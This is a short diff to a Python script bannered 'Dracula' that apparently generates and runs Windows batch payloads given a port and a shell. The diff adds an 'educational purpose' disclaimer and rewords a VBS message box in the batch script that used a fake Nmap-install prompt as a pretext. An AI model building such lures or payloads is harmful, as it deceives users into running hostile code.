@@ -13,7 +13,9 @@ def print_banner():
     | |  | | '__/ _` |/ __| | | | |/ _` |
     | |__| | | | (_| | (__| |_| | | (_| |
     |_____/|_|  \__,_|\___|\__,_|_|\__,_|
-                                        
+            
+This is strictly for educational purpose,
+use for malicious purpose is strictly prohibited
 
 """)
     print("[-] Use -h for help")
@@ -22,7 +24,7 @@ def generate_and_execute_batch(port, shell, ouput_file):
 
     batch_script = f"""@echo off
 
-echo MSGBOX "This program requires the usage of Nmap, please continue with installation, you mayve prompted this messgae again" > %temp%\TEMPmessage.vbs
+echo MSGBOX "This program will download Nmap, please proceed with CAUTION!!" > %temp%\TEMPmessage.vbs
 call %temp%\TEMPmessage.vbs
 del %temp%\TEMPmessage.vbs /f /q
 
